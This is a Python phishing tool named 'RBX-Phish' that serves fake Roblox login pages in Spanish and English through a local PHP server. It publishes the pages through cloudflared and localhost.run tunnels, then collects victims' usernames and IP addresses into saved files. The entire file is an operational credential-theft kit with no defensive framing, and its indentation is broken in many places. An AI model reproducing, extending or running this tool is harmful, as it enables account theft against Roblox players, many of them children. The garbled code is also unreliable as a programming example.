# RBX-Phish
# By: Euronymou5

import os
import time
from re import search
from os.path import isfile
from subprocess import DEVNULL, PIPE, Popen, STDOUT

def cat(file):
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""

error_file = "logs/error.log"

def append(text, filename):
    with open(filename, "a") as file:
        file.write(str(text)+"\n")

def grep(regex, target):
    if isfile(target):
        content = cat(target)
 else:
        content = target
    results = search(regex, content)
    if results is not None:
        return results.group(1)
    return ""

def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr,cwd=cwd)
    except Exception as e:
        append(e, error_file)

cf_file = "logs/cf.log"
lhr_file = "logs/lhr.log"
cf_log = open(cf_file, 'w')
lhr_log = open(lhr_file, 'w')


if os.path.isfile('server/cloudflared'):
   pass
else:
  print('\n\033[31m[!] Cloudflare no esta instalado.')
  print('\n\033[35m[~] Instalando cloudflare...')
  os.system("bash modules/install.sh")

def spanishmenu():
  os.system("clear")
  print('\033[35m██████╗ ██████╗ ██╗  ██╗    \033[36m ██████╗ ██╗  ██╗██╗███████╗██╗  ██')
  time.sleep(0.5)
  print('\033[35m██╔══██╗██╔══██╗╚██╗██╔╝    \033[36m ██╔══██╗██║  ██║██║██╔════╝██║ ██║')
  time.sleep(0.5)
  print('\033[35m██████╔╝██████╔╝ ╚███╔╝\033[35m██\033[36m███╗██████╔╝███████║██║███████╗███████║')
  time.sleep(0.5)
  print('\033[35m██╔══██╗██╔══██╗ ██╔██╗\033[36m╚════╝██╔═══╝ ██╔══██║██║╚════██║██╔══██║')
  time.sleep(0.5)
  print('\033[35m██║  ██║██████╔╝██╔╝ ██╗  \033[36m   ██║     ██║  ██║██║███████║██║  ██║')
  time.sleep(0.5)
  print('\033[35m╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝  \033[36m   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝')
  print('\033[33m       ----------|By: Euronymou5|----------')
  print('\n\033[31m[~] Selecciona el idioma de la pagina:')
  print('\n[1] Español')
  print('\n[2] Ingles')
  num = int(input('\n>> '))
  if num == 1:
    print('\n[~] Iniciando servidor php...')
    os.system("php -S localhost:8080 -t pages/roblox_es > /dev/null 2>&1 &")
    time.sleep(2)
    print('[~] Servidor php: ✔️')
    print('[~] Creando links...')
    bgtask("./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)
    bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
    cf_success = False
    for i in range(10):
        cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
        if cf_url!= "":
            cf_success = True
            break
        time.sleep(1)
    for i in range(10):
        lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
        if lhr_url !="":
            lhr_success = True
            break
        time.sleep(1)
    print(f'[~] Link: {cf_url}')
    print(f'\n[~] Localhost.run: {lhr_url}')
    print('\n[~] Esperando datos...')
    while True:
      if os.path.isfile('pages/roblox_es/usuarios.txt'):
        print('\n\033[31m[!] Usuarios encontrados!')
        print('\033[31m')
        os.system("cat pages/roblox_es/usuarios.txt")
        os.system("cat pages/roblox_es/usuarios.txt >> pages/roblox_es/usuarios_guardados.txt")
        os.system("rm -rf pages/roblox_es/usuarios.txt")
 print('\n\033[34m[~] Usuarios guardados en: usuarios_guardados.txt')
      if os.path.isfile('pages/roblox_es/ip.txt'):
        print('\n\033[31m[!] IP encontrados!')
        print('\033[31m')
        os.system("cat pages/roblox_es/ip.txt")
        os.system("cat pages/roblox_es/ip.txt >> pages/roblox_es/ip_guardados.txt")
        os.system("rm -rf pages/roblox_es/ip.txt")
        print('\n\033[34m[~] IP guardados en: ip_guardados.txt')
  elif num == 2:
 print('\n[~] Iniciando servidor php...')
      os.system("php -S localhost:8080 -t pages/roblox_en > /dev/null 2>&1 &")
      time.sleep(2)
      print('[~] Servidor php: ✔️')
      print('[~] Creando links...')
      bgtask("./server/cloudflared tunnel -urllocalhost:8080", stdout=cf_log, stderr=cf_log)
      bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
      cf_success = False
      for i in range(10):
        cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
        if cf_url != "":
            cf_success = True
            break
        time.sleep(1)
      for i in range(10):
        lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
        if lhr_url != "":
            lhr_success = True
            break
        time.sleep(1)
      print(f'[~] Link: {cf_url}')
      print(f'\n[~] Localhost.run: {lhr_url}')
      print('\n[~] Esperando datos...')
      while True:
       if os.path.isfile('pages/roblox_en/usernames.txt'):
        print('\n\033[31m[!] Usuarios encontrados!')
        print('\033[31m')
  os.system("cat pages/roblox_en/usernames.txt")
        os.system("cat pages/roblox_en/usernames.txt >> pages/roblox_en/users_saved.txt")
        os.system("rm -rf pages/roblox_en/usernames.txt")
        print('\n\033[34m[~] Usuarios guardados en: users_saved.txt')
       if os.path.isfile('pages/roblox_en/ip.txt'):
        print('\n\033[31m[!] IP encontrados!')
        print('\033[31m')
        os.system("cat pages/roblox_en/ip.txt")
        os.system("cat pages/roblox_en/ip.txt >> pages/roblox_en/ip_saved.txt")
        os.system("rm -rf pages/roblox_en/ip.txt")
        print('\n\033[34m[~] IP guardados en: ip_saved.txt')

def englishmenu():
  os.system("clear")
  print('\033[35m██████╗ ██████╗ ██╗  ██╗    \033[36m ██████╗ ██╗  ██╗██╗███████╗██╗  ██')
  time.sleep(0.5)
  print('\033[35m██╔══██╗██╔══██╗╚██╗██╔╝   \033[36m ██╔══██╗██║  ██║██║██╔════╝██║  ██║')
  time.sleep(0.5)
  print('\033[35m██████╔╝██████╔╝ ╚███╔╝\033[35m██\033[36m███╗██████╔╝███████║██║███████╗███████║')
  time.sleep(0.5)
  print('\033[35m██╔══██╗██╔══██╗ ██╔██╗\033[36m╚════╝██╔═══╝ ██╔══██║██║╚════██║██╔══██║')
  time.sleep(0.5)
  print('\033[35m██║  ██║██████╔╝██╔╝ ██╗  \033[36m   ██║     ██║  ██║██║███████║██║  ██║')
  time.sleep(0.5)
  print('\033[35m╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝  \033[36m   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝')
  print('\033[33m       ----------|By: Euronymou5|----------')
  print('\n\033[31m[~] Select the language of the page:')
  print('\n[1] Spanish')
  print('\n[2]English')
  num = int(input('\n>> '))
  if num == 1:
    print('\n[~] Starting php server...')
    os.system("php -S localhost:8080 -t pages/roblox_es > /dev/null 2>&1 &")
    time.sleep(2)
    print('[~] php server: ✔️')
    print('[~] Creating links...')
    bgtask("./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)
   bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
   cf_success = False
    for i in range(10):
        cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
        if cf_url != "":
            cf_success = True
            break
        time.sleep(1)
    for i in range(10):
        lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
        if lhr_url != "":
            lhr_success = True
            break
        time.sleep(1)
    print(f'[~] Link: {cf_url}')
    print(f'\n[~] Localhost.run {lhr_url}')
    print('\n[~] Waiting for data...')
    while True:
      if os.path.isfile('pages/roblox_es/usuarios.txt'):
        print('\n\033[31m[!] Users found!')
        print('\033[31m')
        os.system("cat pages/roblox_es/usuarios.txt")
        os.system("cat pages/roblox_es/usuarios.txt >> pages/roblox_es/usuarios_guardados.txt")
        os.system("rm -rf pages/roblox_es/usuarios.txt")
        print('\n\033[34m[~] Users saved in: usuarios_guardados.txt')
      if os.path.isfile('pages/roblox_es/ip.txt'):
        print('\n\033[31m[!] IP found!')
        print('\033[31m')
        os.system("cat pages/roblox_es/ip.txt")
        os.system("cat pages/roblox_es/ip.txt >> pages/roblox_es/ip_guardados.txt")
        os.system("rm -rf pages/roblox_es/ip.txt")
        print('\n\033[34m[~] IP saved in: ip_guardados.txt')
  elif num == 2:
      print('\n[~] Starting php server...')
      os.system("php -S localhost:8080 -t pages/roblox_en > /dev/null 2>&1 &")
      time.sleep(2)
      print('[~] php server: ✔️')
      print('[~] Creating links...')
      bgtask("./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)
      bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
      cf_success = False
for i in range(10):
        cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
        if cf_url != "":
            cf_success = True
            break
        time.sleep(1)
      for i in range(10):
        lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
       if lhr_url != "":
            lhr_success = True
            break
        time.sleep(1)
      print(f'[~] Link: {cf_url}')
      print(f'[~] Localhost.run: {lhr_url}')
      print('\n[~] Waiting for data...')
      while True:
       if os.path.isfile('pages/roblox_en/usernames.txt'):
        print('\n\033[31m[!] Users found!')
        print('\033[31m')
       os.system("cat pages/roblox_en/usernames.txt")
        os.system("cat pages/roblox_en/usernames.txt >> pages/roblox_en/users_saved.txt")
        os.system("rm -rf pages/roblox_en/usernames.txt")
        print('\n\033[34m[~] Users saved in: users_saved.txt')
       if os.path.isfile('pages/roblox_en/ip.txt'):
        print('\n\033[31m[!] IP found!')
        print('\033[31m')
        os.system("cat pages/roblox_en/ip.txt")
        os.system("cat pages/roblox_en/ip.txt >> pages/roblox_en/ip_saved.txt")
        os.system("rm -rf pages/roblox_en/ip.txt")
      print('\n\033[34m[~] IP saved in: ip_saved.txt')

def config():
  os.system("clear")
  print('\033[35m██████╗ ██████╗ ██╗  ██╗    \033[36m ██████╗ ██╗  ██╗██╗███████╗██╗  ██')
  time.sleep(0.5)
  print('\033[35m██╔══██╗██╔══██╗╚██╗██╔╝    \033[36m ██╔══██╗██║  ██║██║██╔════╝██║  ██║')
  time.sleep(0.5)
  print('\033[35m██████╔╝██████╔╝ ╚███╔╝\033[35m██\033[36m███╗██████╔╝███████║██║███████╗███████║')
  time.sleep(0.5)
  print('\033[35m██╔══██╗██╔══██╗ ██╔██╗\033[36m╚════╝██╔═══╝ ██╔══██║██║╚════██║██╔══██║')
  time.sleep(0.5)
  print('\033[35m██║  ██║██████╔╝██╔╝ ██╗  \033[36m   ██║     ██║  ██║██║███████║██║  ██║')
  time.sleep(0.5)
 print('\033[35m╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝  \033[36m   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝')
  print('\033[33m       ----------|By: Euronymou5|----------')
  print('\033[31m\n[~] Select your language:')
  print("""
  [1] Spanish (Español)
  [2] English (Ingles)
  """)
  a = input('\n>> ')
  if a == "1":
    with open('config.txt', 'w') as config:
 config.write('spanish')
    config.close()
    print('\n\033[32m[ ✔️  ] Configuracion guardada en: config.txt')
    time.sleep(2)
    spanishmenu()
  elif a == "2":
    with open('config.txt', 'w') as config:
      config.write('english')
    config.close()
    print('\n\033[32m[ ✔️  ] Configuration saved in: config.txt')
    time.sleep(2)
    englishmenu()
  else:
    config()

if os.path.isfile('config.txt'):
    f = open('config.txt', 'r')
    lang = f.readlines()
    if "spanish" in lang:
  spanishmenu()
    elif "english" in lang:
      englishmenu()
else:
  config()
